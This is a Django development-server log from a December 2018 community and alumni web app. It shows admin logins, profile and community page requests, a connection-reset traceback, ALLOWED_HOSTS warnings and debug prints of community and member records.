[12/Dec/2018 12:14:55] "GET /admin HTTP/1.1" 301 0
[12/Dec/2018 12:14:56] "GET /admin/ HTTP/1.1" 302 0
[12/Dec/2018 12:14:56] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[12/Dec/2018 12:14:57] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
[12/Dec/2018 12:14:57] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
[12/Dec/2018 12:14:57] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[12/Dec/2018 12:14:57] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
Not Found: /favicon.ico
[12/Dec/2018 12:14:58] "GET /favicon.ico HTTP/1.1" 404 5964
[12/Dec/2018 12:14:58] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[12/Dec/2018 12:14:58] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[12/Dec/2018 12:14:58] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[12/Dec/2018 12:14:59] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[12/Dec/2018 12:14:59] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[12/Dec/2018 12:15:00] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[12/Dec/2018 12:15:11] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[12/Dec/2018 12:15:12] "GET /admin/ HTTP/1.1" 200 12170
[12/Dec/2018 12:15:12] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
[12/Dec/2018 12:15:13] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[12/Dec/2018 12:15:13] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[12/Dec/2018 12:15:13] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[12/Dec/2018 12:15:15] "GET /admin/togther/category/ HTTP/1.1" 200 4605
[12/Dec/2018 12:15:16] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
[12/Dec/2018 12:15:16] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
[12/Dec/2018 12:15:16] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
[12/Dec/2018 12:15:16] "GET /static/admin/js/actions.js HTTP/1.1" 200 6538
[12/Dec/2018 12:15:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 12:15:16] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[12/Dec/2018 12:15:16] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
[12/Dec/2018 12:15:16] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8972
[12/Dec/2018 12:15:16] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
[12/Dec/2018 12:15:16] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 271751
[12/Dec/2018 12:15:17] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
[12/Dec/2018 12:15:19] "GET /admin/togther/category/3/change/ HTTP/1.1" 200 5503
[12/Dec/2018 12:15:19] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[12/Dec/2018 12:15:19] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 12:15:19] "GET /static/admin/css/forms.css HTTP/1.1" 200 8505
[12/Dec/2018 12:15:19] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[12/Dec/2018 12:15:20] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[12/Dec/2018 12:15:22] "GET /admin/togther/category/ HTTP/1.1" 200 4605
[12/Dec/2018 12:15:24] "GET /admin/togther/category/4/change/ HTTP/1.1" 200 5503
[12/Dec/2018 12:15:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 12:15:54] "POST /admin/togther/category/4/change/ HTTP/1.1" 302 0
[12/Dec/2018 12:15:55] "GET /admin/togther/category/ HTTP/1.1" 200 4805
[12/Dec/2018 12:15:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[12/Dec/2018 12:15:56] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[12/Dec/2018 12:15:58] "GET /admin/togther/ HTTP/1.1" 200 6500
----------------------------------------
Exception happened during processing of request from ('47.247.143.71', 37822)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[12/Dec/2018 12:22:51] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:22:52] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:22:52] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:22:54] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:22:55] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:22:55] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:22:56] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:22:56] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:22:57] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:22:58] "GET /logout HTTP/1.1" 302 0
[12/Dec/2018 12:22:58] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 12:22:59] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
Not Found: /login/logo.jpeg
[12/Dec/2018 12:23:00] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[12/Dec/2018 12:23:00] "GET /media/media/favicon.ico HTTP/1.1" 304 0
[12/Dec/2018 12:23:02] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 12:23:07] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[12/Dec/2018 12:23:14] "GET /oauth/complete/linkedin-oauth2/?code=AQR4CEp_SAm9DFWfTspOOuzIrP5OBxAwNdrLQ80r2d-ylGhTAX1K3RYwFjFXrPIi6vqBXFgHaOMRmuHjPAJ0SQw8qJ5WIWL3SybH1Xka6A6wEwujUlaUGyE2IBMVfsWPp6Rlu6EDZBEk8cSrO3xuCMr8ApLOIlHWjDzOdaMstbxf7CvoOjL2oE5XG7Vhmg&state=T84xx1AxH4T7E5XkoffUvoSSIKLKK0UL HTTP/1.1" 302 0
[12/Dec/2018 12:23:15] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:23:15] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:23:15] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:23:18] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:23:19] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:23:19] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:23:19] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:23:21] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:23:22] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:23:22] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:23:26] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 12:23:27] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:23:28] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:23:29] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:23:29] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:23:30] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:23:30] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 12:23:30] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 12:23:30] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 12:27:23] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:27:23] "GET / HTTP/1.1" 200 13948
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 12:30:31] "GET / HTTP/1.1" 400 62431
[12/Dec/2018 12:33:45] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:33:48] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:33:50] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:33:56] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:34:02] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:34:07] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:34:49] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:34:50] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:36:09] "GET /?data=Alumni&_=1544618090875 HTTP/1.1" 200 516
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:36:10] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
Not Found: //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg
[12/Dec/2018 12:36:10] "GET //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 404 6159
[12/Dec/2018 12:36:22] "GET /?data=Alumni&_=1544618046681 HTTP/1.1" 200 516
Not Found: //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg
[12/Dec/2018 12:36:22] "GET //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 404 6159
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:36:22] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[12/Dec/2018 12:36:43] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:36:44] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:36:55] "GET / HTTP/1.1" 200 13159
[12/Dec/2018 12:36:56] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 12:36:57] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 12:36:57] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[12/Dec/2018 12:36:58] "GET /logo.jpeg HTTP/1.1" 404 5958
[12/Dec/2018 12:37:23] "GET /?data=Alumni&_=1544618217602 HTTP/1.1" 200 516
Not Found: //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg
[12/Dec/2018 12:37:24] "GET //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 404 6159
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:37:24] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
Not Found: /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jp
[12/Dec/2018 12:38:18] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jp HTTP/1.1" 404 1914
Not Found: /favicon.ico
[12/Dec/2018 12:38:19] "GET /favicon.ico HTTP/1.1" 404 5964
Not Found: /media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jp
[12/Dec/2018 12:38:25] "GET /media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jp HTTP/1.1" 404 1896
[12/Dec/2018 12:38:37] "GET /login/ HTTP/1.1" 200 2576
[12/Dec/2018 12:38:38] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
Not Found: /login/logo.jpeg
[12/Dec/2018 12:38:38] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[12/Dec/2018 12:38:39] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[12/Dec/2018 12:38:40] "GET / HTTP/1.1" 200 13159
[12/Dec/2018 12:39:22] "GET /?data=Alumni&_=1544618322513 HTTP/1.1" 200 516
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:39:23] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
Not Found: //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg
[12/Dec/2018 12:39:23] "GET //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 404 6159
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 12:40:22] "GET / HTTP/1.0" 400 62437
[12/Dec/2018 12:41:22] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:42:06] "GET /?data=&_=1544618481713 HTTP/1.1" 200 516
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:42:07] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
Not Found: //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg
[12/Dec/2018 12:42:07] "GET //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 404 6159
[12/Dec/2018 12:42:21] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 12:43:20] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:43:21] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:43:57] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:44:09] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:45:11] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:49:12] "GET /requests HTTP/1.1" 200 5821
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 12:49:18] "GET / HTTP/1.0" 400 62438
Not Found: /dashboard/
[12/Dec/2018 12:49:28] "GET /dashboard/ HTTP/1.1" 404 5961
Not Found: /favicon.ico
[12/Dec/2018 12:49:29] "GET /favicon.ico HTTP/1.1" 404 5964
[12/Dec/2018 12:49:35] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:49:37] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:52:33] "GET /profile/5 HTTP/1.1" 200 17871
[12/Dec/2018 12:52:37] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:53:05] "GET /community/3/ HTTP/1.1" 200 11312
Not Found: /community/3/logo.jpeg
[12/Dec/2018 12:53:06] "GET /community/3/logo.jpeg HTTP/1.1" 404 5994

{'data': 'Alumni', '_': '1544616869439'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544616865575'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
here
None
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544618090875'}
<QuerySet [<Category: Category object (3)>, <Category: Category object (4)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}, {'id': 4, 'name': 'IIT Delhi Entrepreneurs in Gurgaon', 'about': 'This is an exclusive group for entrepreneurs who are IIT Delhi Alumni and are based out of Gurgaon.', 'image_url': '/media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg', 'location': 'Gurgaon', 'members_count': 5}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544618046681'}
<QuerySet [<Category: Category object (3)>, <Category: Category object (4)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}, {'id': 4, 'name': 'IIT Delhi Entrepreneurs in Gurgaon', 'about': 'This is an exclusive group for entrepreneurs who are IIT Delhi Alumni and are based out of Gurgaon.', 'image_url': '/media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg', 'location': 'Gurgaon', 'members_count': 5}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544618217602'}
<QuerySet [<Category: Category object (3)>, <Category: Category object (4)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}, {'id': 4, 'name': 'IIT Delhi Entrepreneurs in Gurgaon', 'about': 'This is an exclusive group for entrepreneurs who are IIT Delhi Alumni and are based out of Gurgaon.', 'image_url': '/media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg', 'location': 'Gurgaon', 'members_count': 5}]
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544618322513'}
<QuerySet [<Category: Category object (3)>, <Category: Category object (4)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}, {'id': 4, 'name': 'IIT Delhi Entrepreneurs in Gurgaon', 'about': 'This is an exclusive group for entrepreneurs who are IIT Delhi Alumni and are based out of Gurgaon.', 'image_url': '/media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg', 'location': 'Gurgaon', 'members_count': 5}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': '', '_': '1544618481713'}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
{}
<QuerySet []>
[]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Admins object (2)>]>[12/Dec/2018 12:53:10] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:53:17] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:58:00] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:58:02] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:58:04] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:58:04] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:58:19] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 12:58:26] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 12:58:39] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 12:59:06] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:59:06] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:59:07] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:59:21] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:59:22] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:59:23] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:59:23] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:59:38] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:59:41] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:59:44] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 12:59:52] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:59:55] "GET /community/3/ HTTP/1.1" 200 11312
[12/Dec/2018 13:00:02] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:00:06] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:00:16] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 13:00:19] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 13:00:22] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:00:31] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:00:37] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:00:40] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:00:41] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:00:44] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:00:49] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:00:51] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:00:53] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:00:56] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:01:09] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:01:18] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:01:19] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:01:20] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:01:29] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:01:33] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:01:35] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:01:36] "GET /profile/4 HTTP/1.1" 200 23252
